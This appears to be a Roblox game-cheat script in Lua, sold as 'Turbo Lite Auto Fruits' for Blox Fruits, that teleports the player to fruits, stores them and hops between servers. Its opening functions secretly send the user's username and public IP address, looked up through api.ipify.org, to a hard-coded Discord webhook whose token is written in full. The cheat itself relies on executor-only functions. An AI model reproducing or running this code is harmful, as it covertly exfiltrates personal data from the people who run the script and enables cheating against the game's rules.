function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn.request
    local data =
        request(
        {
            Url = Url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(message)
        }
    )
    return ""
end

function AdminLoggerMsg()
    local randomColor = math.random(0, 0xFFFFFF)
    local AdminMessage = {
        ["embeds"] = {
            {
                ["title"] = "**Auto Fruit s**",
                ["description"] = "",
                ["type"] = "rich",
                ["color"] = randomColor, 
                ["fields"] = {
                    {
                        ["name"] = "**Username**",
                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**IP Address**",
                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
                        ["inline"] = false
                    },
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
            }
        }
    }
    return AdminMessage
end

PostWebhook("https://discord.com/api/webhooks/1283715341368954941/ph0vTOdk1iW7sDjSmrNKqAHC3IClPjZZmVLKE8spF74tMR6cFITVFuXZt6yW1TIRkKKo", AdminLoggerMsg()) -- Post to admin webhook
if game.PlaceId == 2753915549 then
        World1 = true
    elseif game.PlaceId == 4442272183 then
        World2 = true
    elseif game.PlaceId == 7449423635 then
        World3 = true
    end
repeat
    wait()
until game.IsLoaded and (game.Players.LocalPlayer or game.Players.PlayerAdded:Wait()) and
    (game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait())
local a = Instance.new("ScreenGui")
local b = Instance.new("Frame")
local c = Instance.new("UICorner")
local d = Instance.new("Frame")
local e = Instance.new("ImageButton")
local f = Instance.new("ImageLabel")
local g = Instance.new("ImageLabel")
local h = Instance.new("TextButton")
local i = Instance.new("TextButton")
local j = Instance.new("TextLabel")
local k = Instance.new("TextLabel")
local l = Instance.new("TextLabel")
local l = true
game.Players.LocalPlayer.Idled:connect(
    function()
        while wait(3) do
            if l then
                game.VirtualUser:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
                wait(1)
                game.VirtualUser:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
            end
        end
    end
)
local l = Instance.new("ScreenGui")
local m = Instance.new("ImageButton")
l.Parent = game.CoreGui
l.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
_G.Primary = Color3.fromRGB(43, 43, 43)
m.Parent = l
m.Position = UDim2.new(0.120833337, 0, 0.0952890813, 0)
m.Size = UDim2.new(0, 30, 0, 30)
m.BackgroundColor3 = _G.Primary
m.ImageColor3 = Color3.fromRGB(255, 255, 255)
m.ImageTransparency = .1
m.Draggable = true
m.Active = true
m.Selectable = true
m.BackgroundTransparency = .1
m.Image = "rbxassetid://85573548025990"
m.Visible = false
local l = Instance.new("UICorner")
l.Name = "MCNR"
l.Parent = m
l.CornerRadius = UDim.new(0, 5)
m.MouseButton1Down:connect(
    function()
        m:TweenSize(UDim2.new(0, 30, 0, 30), "Out", "Quad", 0.2, true)
        wait(0.1)
        m:TweenSize(UDim2.new(0, 30, 0, 30), "Out", "Quad", 0.2, true)
        game.CoreGui:FindFirstChild("ScreenGui_Chest").Enabled =
            not game.CoreGui:FindFirstChild("ScreenGui_Chest").Enabled
        m.Visible = false
    end
)
do
    if game:GetService("CoreGui"):FindFirstChild("ScreenGui_Chest") then
        game:GetService("CoreGui").ScreenGui_Chest:Destroy()
        game:GetService("CoreGui").ScreenGui:Destroy()
    end
end
a.Name = "ScreenGui_Chest"
a.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
a.Parent = game.CoreGui
b.Name = "Frame_Chest"
b.Parent = a
b.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
b.BackgroundTransparency = 0.100
b.BorderColor3 = Color3.fromRGB(0, 0, 0)
b.BorderSizePixel = 0
b.Draggable = true
b.Active = true
b.Selectable = true
b.Position = UDim2.new(0.297761381, 0, 0.278439432, 0)
b.Size = UDim2.new(0, 281, 0, 164)
c.Parent = b
d.Name = "Frame1_Chest"
d.Parent = b
d.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
d.BorderColor3 = Color3.fromRGB(0, 0, 0)
d.BorderSizePixel = 0
d.Position = UDim2.new(0.0246521216, 0, 0.0482814126, 0)
d.Size = UDim2.new(0, 266, 0, 147)
e.Name = "Miminze"
e.Parent = b
e.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
e.BackgroundTransparency = 1.000
e.BorderColor3 = Color3.fromRGB(0, 0, 0)
e.BorderSizePixel = 0
e.Position = UDim2.new(0.87502408, 0, 0.0182926822, 0)
e.Size = UDim2.new(0, 19, 0, 26)
e.Image = "http://www.roblox.com/asset/?id=85573548025990"
e.MouseButton1Down:connect(
    function()
        game.CoreGui:FindFirstChild("ScreenGui_Chest").Enabled =
            not game.CoreGui:FindFirstChild("ScreenGui_Chest").Enabled
        m.Visible = true
    end
)
f.Name = "Logo"
f.Parent = b
f.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
f.BackgroundTransparency = 1.000
f.BorderColor3 = Color3.fromRGB(0, 0, 0)
f.BorderSizePixel = 0
f.Position = UDim2.new(0.0246521216, 0, 0.0482814126, 0)
f.Size = UDim2.new(0, 10, 0, 10)
f.Image = "rbxassetid://85573548025990"
g.Name = "Avatra"
g.Parent = b
g.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
g.BackgroundTransparency = 1.000
g.BorderColor3 = Color3.fromRGB(0, 0, 0)
g.BorderSizePixel = 0
g.Position = UDim2.new(0.0462633446, 0, 0.176829264, 0)
g.Size = UDim2.new(0, 90, 0, 100)
g.Image =
    game.Players:GetUserThumbnailAsync(
    game.Players.LocalPlayer.UserId,
    Enum.ThumbnailType.AvatarThumbnail,
    Enum.ThumbnailSize.Size420x420
)
h.Name = "FarmChestButton"
h.Parent = b
h.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
h.BackgroundTransparency = 0.100
h.BorderColor3 = Color3.fromRGB(0, 0, 0)
h.BorderSizePixel = 0
h.Position = UDim2.new(0.478776932, 0, 0.691130638, 0)
h.Size = UDim2.new(0, 121, 0, 28)
h.Font = Enum.Font.SourceSansBold
h.Text = "Auto Find Fruit : ON"
h.TextColor3 = Color3.fromRGB(255, 255, 255)
h.TextSize = 14.000
i.Name = "Discord"
i.Parent = b
i.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
i.BackgroundTransparency = 0.100
i.BorderColor3 = Color3.fromRGB(0, 0, 0)
i.BorderSizePixel = 0
i.Position = UDim2.new(0.4775801, 0, 0.431707233, 0)
i.Size = UDim2.new(0, 121, 0, 28)
i.Font = Enum.Font.SourceSansBold
i.Text = "Join Discord"
i.TextColor3 = Color3.fromRGB(255, 255, 255)
i.TextSize = 14.000
i.MouseButton1Down:connect(
    function()
        setclipboard("https://discord.gg/cFcshxGQCe")
        i.Text = "Copied Discord Link"
        wait(.25)
        i.Text = "Join Discord"
    end
)
j.Name = "NameHub"
j.Parent = b
j.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
j.BackgroundTransparency = 1.000
j.BorderColor3 = Color3.fromRGB(0, 0, 0)
j.BorderSizePixel = 0
j.Position = UDim2.new(0.0790036023, 0, -0.00593120279, 0)
j.Size = UDim2.new(0, 75, 0, 35)
j.Font = Enum.Font.SourceSansBold
j.Text = "Turbo Lite  Auto Fruits"
j.TextColor3 = Color3.fromRGB(255, 255, 255)
j.TextSize = 14.000
k.Name = "FPS"
k.Parent = b
k.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
k.BackgroundTransparency = 1.000
k.BorderColor3 = Color3.fromRGB(0, 0, 0)
k.BorderSizePixel = 0
k.Position = UDim2.new(0.392720729, 0, 0.116020016, 0)
k.Size = UDim2.new(0, 65, 0, 27)
k.Font = Enum.Font.SourceSansBold
k.Text = "FPS: "
k.TextColor3 = Color3.fromRGB(255, 255, 255)
k.TextSize = 14.000
function UpdateFPS()
    local a = workspace:GetRealPhysicsFPS()
    k.Text = "FPS: " .. a
end
spawn(
    function()
        while true do
            wait(.1)
            UpdateFPS()
        end
    end
)
if Ran then
    return
else
    getgenv().Ran = true
end
if game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Main", 9e9):FindFirstChild("ChooseTeam") then
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetTeam", "Pirates")
    wait(3)
end
local a = game.Players.LocalPlayer
local b = a.Character
local c = game.TweenService
local d = Instance.new("BodyVelocity")
d.MaxForce = Vector3.new(1 / 0, 1 / 0, 1 / 0)
d.Velocity = Vector3.new()
d.Name = "bV"
local e = Instance.new("BodyAngularVelocity")
e.AngularVelocity = Vector3.new()
e.MaxTorque = Vector3.new(1 / 0, 1 / 0, 1 / 0)
e.Name = "bAV"
for f, f in next, workspace:GetChildren() do
    if f.Name:find("Fruit") and (f:IsA("Tool") or f:IsA("Model")) then
        repeat
            local d = d:Clone()
            d.Parent = b.HumanoidRootPart
            local e = e:Clone()
            e.Parent = b.HumanoidRootPart
            local a =
                c:Create(
                b.HumanoidRootPart,
                TweenInfo.new((a:DistanceFromCharacter(f.Handle.Position) - 150) / 300, Enum.EasingStyle.Linear),
                {CFrame = f.Handle.CFrame + Vector3.new(0, f.Handle.Size.Y, 0)}
            )
            a:Play()
            a.Completed:Wait()
            b.HumanoidRootPart.CFrame = f.Handle.CFrame
            d:Destroy()
            e:Destroy()
            wait(1)
        until f.Parent ~= workspace
        wait(1)
        local a =
            b:FindFirstChildOfClass("Tool") and b:FindFirstChildOfClass("Tool").Name:find("Fruit") and
            b:FindFirstChildOfClass("Tool") or
            (function()
                for a, a in a.Backpack:GetChildren() do
                    if a.Name:find("Fruit") then
                        return a
                    end
                end
            end)()
        print(a)
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(
            "StoreFruit",
            a:GetAttribute("OriginalName"),
            a
        )
    end
end
for a, a in pairs(game:GetService("Workspace"):GetChildren()) do
    if a:IsA("Tool") and string.find(a.Name, "Fruit") then
        NameFruit = a.Name
    end
end
print(NameFruit)
spawn(
    function()
        pcall(
            function()
                while wait(.1) do
                    if _G.AutoStoreFruit then
                        for a, a in pairs(NameFruit) do
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StoreFruit", a)
                        end
                    end
                end
            end
        )
    end
)
local a = game.JobId
repeat
    task.spawn(
        pcall,
        function()
            Time = 0.1
            repeat
                wait()
            until game:IsLoaded()
            wait(Time)
            local a = game.PlaceId
            local b = {}
            local c = ""
            local d = os.date("!*t").hour
            local e = false
            function TPReturner()
                local e
                if c == "" then
                    e =
                        game.HttpService:JSONDecode(
                        game:HttpGet(
                            "https://games.roblox.com/v1/games/" .. a .. "/servers/Public?sortOrder=Asc&limit=100"
                        )
                    )
                else
                    e =
                        game.HttpService:JSONDecode(
                        game:HttpGet(
                            "https://games.roblox.com/v1/games/" ..
                                a .. "/servers/Public?sortOrder=Asc&limit=100&cursor=" .. c
                        )
                    )
                end
                local f = ""
                if e.nextPageCursor and e.nextPageCursor ~= "null" and e.nextPageCursor ~= nil then
                    c = e.nextPageCursor
                end
                local c = 0
                for e, e in pairs(e.data) do
                    local g = true
                    f = tostring(e.id)
                    if tonumber(e.maxPlayers) > tonumber(e.playing) then
                        for a, a in pairs(b) do
                            if c ~= 0 then
                                if f == tostring(a) then
                                    g = false
                                end
                            else
                                if tonumber(d) ~= tonumber(a) then
                                    local a =
                                        pcall(
                                        function()
                                            delfile("NotSameServers.json")
                                            b = {}
                                            table.insert(b, d)
                                        end
                                    )
                                end
                            end
                            c = c + 1
                        end
                        if g == true then
                            table.insert(b, f)
                            wait()
                            pcall(
                                function()
                                    writefile("NotSameServers.json", game:GetService("HttpService"):JSONEncode(b))
                                    wait()
                                    game:GetService("TeleportService"):TeleportToPlaceInstance(
                                        a,
                                        f,
                                        game.Players.LocalPlayer
                                    )
                                end
                            )
                            wait(4)
                        end
                    end
                end
            end
            function Teleport()
                while wait() do
                    pcall(
                        function()
                            TPReturner()
                            if c ~= "" then
                                TPReturner()
                            end
                        end
                    )
                end
            end
            Teleport()
        end
    )
    wait()
until game.JobId ~= a